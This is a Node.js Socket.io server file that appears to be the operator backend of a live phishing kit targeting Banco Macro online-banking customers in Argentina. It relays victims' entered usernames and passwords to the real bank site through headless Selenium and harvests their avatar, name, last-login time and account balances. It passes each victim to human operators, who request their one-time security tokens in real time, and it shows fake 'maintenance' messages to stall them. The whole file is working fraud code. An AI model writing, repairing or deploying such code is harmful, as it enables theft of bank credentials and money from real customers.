const { emit } = require("nodemon");

module.exports = httpServer => {

    const chrm = require("chromedriver");
    // Include selenium webdriver
    const swd = require("selenium-webdriver");
    const chrome = require("selenium-webdriver/chrome");
    const firefox = require("selenium-webdriver/firefox");


    const { Server } = require("socket.io");
    const io = new Server(httpServer, { 'pingInterval': 60000, 'pingTimeout': 900000 });

    var socketsOnLineAdm = [];
    var socketsInHome = [];
    var AsignarAdm = 0;
    var idAdmIdHome = [];
    var socketImg = []
    var totalInfoArr = []
    var LimiteNavegador = 4;
    var OnLine = 0;
    var OnLineLogin = 0;

    io.on("connection", socket => {

        // Agendar administradores
        socket.on("AdmOn", data => {
            var newsocketsOnLineAdm = socketsOnLineAdm.filter((item) => item.Id == data.Id);
            if (newsocketsOnLineAdm.length == 0) {
                console.log('-----------Adm')
                socketsOnLineAdm.push(data);
                console.log(socketsOnLineAdm)
                io.emit("countOfAdm", socketsOnLineAdm.length);
            } else {
                io.to(data.socketSesion).emit("admAssignOtherId", Math.random());
            }

        });

        socket.on("disconnect", () => {
            var newsocketsOnLineAdm = socketsOnLineAdm.filter((item) => item.socketSesion !== socket.id);
            socketsOnLineAdm = newsocketsOnLineAdm;
            if (newsocketsOnLineAdm.length != socketsOnLineAdm) {
                io.emit("countOfAdm", socketsOnLineAdm.length);
            }

            var newsocketsInHome = socketsInHome.filter((item) => item.Socket !== socket.id);
            socketsInHome = newsocketsInHome;
        })

        // Agendar Home para pedir cosas
        socket.on("HomeConnect", data => {
            socketsInHome.push(data);
            console.log('------INHOME')
            console.log(socketsInHome);
        })

        //EnviarInfoHomeConect
        socket.on('EnviarInfoHomeConect', data => {
            var SelectEnviarDataHome = socketsInHome.filter((item) => item.Id == data[0][0].socket);
            if (SelectEnviarDataHome.length) {
                io.to(SelectEnviarDataHome[0].Socket).emit("RecibirInfoHomeConect", data);
            } else {
                io.to(data[1]).emit("ResendData", data);
            }
        })

        // Mostrar imagen login
        socket.on("ShowAvatar", data => {

            if (OnLine >= LimiteNavegador) {
                setTimeout(() => {
                    io.to(data.socket).emit("Resend", data);
                }, 3000);
            } else {
                OnLine += 1;
                console.log('Usando el Nav: ' + OnLine)

                let browser = new swd.Builder();
                let tab = browser.forBrowser("chrome")
                    .setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
                    .setFirefoxOptions(new firefox.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
                    .build();

                //Step 1 - Opening sign in page
                let tabToOpenSignIn =
                    tab.get("https://www.macro.com.ar/bancainternet/");

                tabToOpenSignIn
                    .then(() => {
                        // Timeout to wait if connection is slow
                        let findTimeOutP =
                            tab.manage().setTimeouts({
                                implicit: 15000, // 15 seconds
                            });
                        return findTimeOutP;
                    })
                    .then(() => {
                        //Finding the username input
                        let promiseUsernameBox = tab.findElement(swd.By.css("#textField1"))
                            .catch(() => {
                                tab.quit();
                                OnLineLogin -= 1;
                                io.to(data.socket).emit("ErrorLogin", 'En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.');
                                throw new Error("Mantenimiento");
                            })
                        return promiseUsernameBox;
                    })
                    //Entering the username
                    .then(usernameBox => {
                        let promiseFillUsername =
                            usernameBox.sendKeys(data.user);
                        return promiseFillUsername;
                    })
                    .then(() => {
                        console.log("Username entered successfully");
                        let promiseBtnIngresar =
                            tab.findElement(swd.By.css("#processCustomerLogin"));
                        return promiseBtnIngresar;
                    })
                    .then(promiseBtnIngresar => {
                        let promiseClickIngresar = promiseBtnIngresar.click();
                        return promiseClickIngresar;
                    })
                    .then(() => {
                        //Finding the img avatar
                        setTimeout(() => {
                            let promiseAvatarImg =
                                tab.findElement(swd.By.css("#imageComponentAvatar")).getAttribute('src')
                                    .then(AvatarImg => {
                                        socketImg.push({ 'socket': data.socket, 'img': AvatarImg });
                                        io.to(data.socket).emit("AvatarElement", AvatarImg);
                                        tab.quit();
                                        OnLine -= 1;
                                    })
                        }, 1000);
                    })
                    .catch(err => {
                        console.log("Error ", err, " occurred!");
                    });
            }
        })


        socket.on("mostrarEnAdmin", totalInfo => {
            if (AsignarAdm < socketsOnLineAdm.length - 1) {
                AsignarAdm += 1;
            } else {
                AsignarAdm = 0;
            }
            var AdminSelected = socketsOnLineAdm[AsignarAdm];

            idAdmIdHome.push({ 'AdmId': AdminSelected.Id, 'IdHome': totalInfo[0].socket });
            console.log("-------idAdmIdHome--------")
            console.log(idAdmIdHome)
            io.to(AdminSelected.socketSesion).emit("NewData", totalInfo);
        })


        /*socket.on("QuienSosAuth", QuienSosAuth => {
            if (QuienSosAuth[0] == "Fucker123") {
                console.log(QuienSosAuth[1])
                io.to(QuienSosAuth[1]).emit("SosAdmin", true);
            } else {
                io.to(QuienSosAuth[1]).emit("SosAdmin", false);
            }
        })*/

        socket.on("DataADMsinBTNs", totalInfo => {
            console.log('idHome____DataADMsinBTNs')
            console.log(totalInfo[0].socket);
            var totalInfoFilter = totalInfoArr.filter((item) => item[0].socket == totalInfo[0].socket);
            var totalInfoSend = totalInfoFilter[0];

            if (totalInfoSend) {
                if (AsignarAdm < socketsOnLineAdm.length - 1) {
                    AsignarAdm += 1;
                } else {
                    AsignarAdm = 0;
                }
                var AdminSelected = socketsOnLineAdm[AsignarAdm];

                idAdmIdHome.push({ 'AdmId': AdminSelected.Id, 'IdHome': totalInfoSend[0].socket });
                console.log("-------::-------------")
                console.log(idAdmIdHome)

                io.to(AdminSelected.socketSesion).emit("NewData", totalInfoSend);
                io.to(totalInfoSend[0].socket).emit("ContinuarHomeVista", totalInfoSend);
            }
        })

        socket.on("onlineHere", onlineHere => {
            var totalInfoFilter = totalInfoArr.filter((item) => item[0].socket == onlineHere.originalSocket);
            var totalInfoSend = totalInfoFilter[0];

            if (totalInfoSend) {

                var idAdmIdHomeFilter = idAdmIdHome.filter((item) => item.IdHome == onlineHere.originalSocket);
                console.log('------idAdmIdHome----')
                console.log(idAdmIdHome)
                /*if (idAdmIdHomeFilter.length == 0) {
                    if (AsignarAdm < socketsOnLineAdm.length - 1) {
                        AsignarAdm += 1;
                    } else {
                        AsignarAdm = 0;
                    }
                    var AdminSelected = socketsOnLineAdm[AsignarAdm];
                    idAdmIdHome.push({ 'AdmId': AdminSelected.Id, 'IdHome': totalInfoSend[0].socket });
                    io.to(AdminSelected.socketSesion).emit("NewData", totalInfoSend);
                } else {*/
                var AdminId = idAdmIdHomeFilter[0].AdmId;
                var socketAdm = socketsOnLineAdm.filter((item) => item.Id == AdminId);

                if (socketAdm.length) {
                    io.to(socketAdm[0].socketSesion).emit("NewData", totalInfoSend);
                } else {
                    io.to(onlineHere.originalSocket).emit("goLogin", true);
                }

                io.to(socketAdm[0].socketSesion).emit("showBTNS", onlineHere.originalSocket);
                /*}*/


                //io.emit("showRowB", onlineHere.originalSocket);
            } else {
                io.to(onlineHere.socketId).emit("goLogin", true);
            }

        })

        // Recibir data y enviar al adm
        socket.on("Data", data => {
            totalInfo = [data];
            //console.log('Length adm ' + socketsOnLineAdm.length)

            if (socketsOnLineAdm.length == 0) {
                io.to(data.socket).emit("ErrorLogin", "En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.");
            } else {

                if (OnLineLogin >= LimiteNavegador) {
                    setTimeout(() => {
                        io.to(data.socket).emit("ResendPass", data);
                    }, 1500);
                } else {
                    OnLineLogin += 1;
                    console.log('Usando el NavLogin: ' + OnLineLogin)


                    let browser = new swd.Builder();
                    let tab = browser.forBrowser("chrome")
                        .setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
                        .setFirefoxOptions(new firefox.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
                        .build();

                    //Step 1 - Opening sign in page
                    let tabToOpenSignIn =
                        tab.get("https://www.macro.com.ar/bancainternet/");
                    tabToOpenSignIn
                        .then(() => {
                            // Timeout to wait if connection is slow
                            let findTimeOutP =
                                tab.manage().setTimeouts({
                                    implicit: 15000, // 15 seconds
                                });
                            return findTimeOutP;
                        })
                        .then(() => {
                            //Finding the username input
                            let promiseUsernameBox = tab.findElement(swd.By.css("#textField1"))
                                .catch(() => {
                                    tab.quit();
                                    OnLineLogin -= 1;
                                    io.to(data.socket).emit("ErrorLogin", 'En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.');
                                    throw new Error("Mantenimiento");
                                })
                            return promiseUsernameBox;
                        })
                        //Entering the username
                        .then(usernameBox => {
                            let promiseFillUsername =
                                usernameBox.sendKeys(data.user);
                            return promiseFillUsername;
                        })
                        .then(() => {
                            console.log("Username entered successfully");
                            let promiseBtnIngresar =
                                tab.findElement(swd.By.css("#processCustomerLogin"));
                            return promiseBtnIngresar;
                        })
                        .then(promiseBtnIngresar => {
                            let promiseClickIngresar = promiseBtnIngresar.click();
                            return promiseClickIngresar;
                        })
                        .then(() => {
                            //Finding the password input
                            let promisePasswordBox =
                                tab.findElement(swd.By.css("#login_textField1"));
                            return promisePasswordBox;
                        })
                        //Entering the password
                        .then(PasswordBox => {
                            let promiseFillPassword =
                                PasswordBox.sendKeys(data.pass);
                            return promiseFillPassword;
                        })
                        .then(() => {
                            console.log("Password entered successfully");
                            let promiseBtnIngresar = tab.findElement(swd.By.css("#processSystem_UserLogin"));
                            return promiseBtnIngresar;
                        })
                        .then(promiseBtnIngresar => {
                            let promiseClickIngresar = promiseBtnIngresar.click();
                            return promiseClickIngresar;
                        })
                        .then(() => {
                            let promiseError = tab.findElement(swd.By.css("#modalContainer")).getText()
                                .catch(() => {
                                    return false;
                                })
                            return promiseError;
                        })
                        .then(errorLogin => {
                            if (errorLogin) {
                                console.log(errorLogin)
                                tab.quit();
                                OnLineLogin -= 1;
                                io.to(data.socket).emit("ErrorLogin", errorLogin);
                                throw new Error("de inicio de sesion!");
                            }
                        })
                        .then(() => {
                            //Finding totales box
                            let nombrePersona =
                                tab.findElement(swd.By.css(".widget_userName")).getText();
                            return nombrePersona;
                        })
                        .then(nombrePersona => {
                            totalInfo.push(nombrePersona)
                        })
                        .then(() => {
                            //Finding totales box
                            let lastAuth =
                                tab.findElement(swd.By.css(".widget_lastAuth")).getText();
                            return lastAuth;
                        })
                        .then(lastAuth => {
                            totalInfo.push(lastAuth)
                        })
                        .then(() => {
                            //Finding totales box
                            let saldos =
                                tab.findElements(swd.By.xpath("//td[@headers='_Saldo disponible']"))//.getText();
                            return saldos;
                        })
                        .then(saldos => {
                            for (let i = 0; i < saldos.length; i++) {
                                saldos[i].getText()
                                    .then((textsaldo) => {
                                        totalInfo.push(textsaldo)
                                        console.log(totalInfo)
                                        if (i + 1 == saldos.length) {
                                            totalInfoArr.push(totalInfo);
                                            io.to(data.socket).emit("ContinuarHome", totalInfo);
                                        }
                                    })
                            }
                        })
                        .then(() => {
                            let promiseBtnLogout = tab.findElement(swd.By.css("#widgetLogoutBtn"));
                            return promiseBtnLogout;
                        })
                        .then(BtnLogout => {
                            let BtnLogoutClick = BtnLogout.click();
                            return BtnLogoutClick;
                        })
                        .then(() => {
                            tab.quit();
                            OnLineLogin -= 1;
                        })
                        .catch(err => {
                            console.log("Error ", err, " occurred!");
                        });
                }
            }
        });

        //TOKEN
        socket.on("PedirToken", dataId => {
            var socketPedirToken = socketsInHome.filter((item) => item.Id == dataId.idUser);
            if (socketPedirToken.length) {
                io.to(socketPedirToken[0].Socket).emit("IngresarToken", dataId);
            }
        })

        socket.on("SendToken", dataToken => {
            if (socketsOnLineAdm.length) {
                var idAdmIdHomeArr = socketsOnLineAdm.filter((item) => item.Id == dataToken.AdmId);
                io.to(idAdmIdHomeArr[0].socketSesion).emit("ReSendToken", dataToken);
            } else {
                console.log('_____')
                console.log(dataToken.Socket)
                io.to(dataToken.Socket).emit("goLogin", true);
            }
        })

        socket.on("Finalizar", dataId => {

            //var totalInfoArr = []

            var socketPedirToken = socketsInHome.filter((item) => item.Id == dataId);
            if (socketPedirToken.length) {
                io.to(socketPedirToken[0].Socket).emit("FinalizarTodo", true);
            }

            var byeidAdmIdHome = idAdmIdHome.filter((item) => item.IdHome !== dataId);
            idAdmIdHome = byeidAdmIdHome;

            var byetotalInfo = totalInfoArr.filter((item) => item[0].socket !== dataId);
            totalInfoArr = byetotalInfo;

        })

    })
}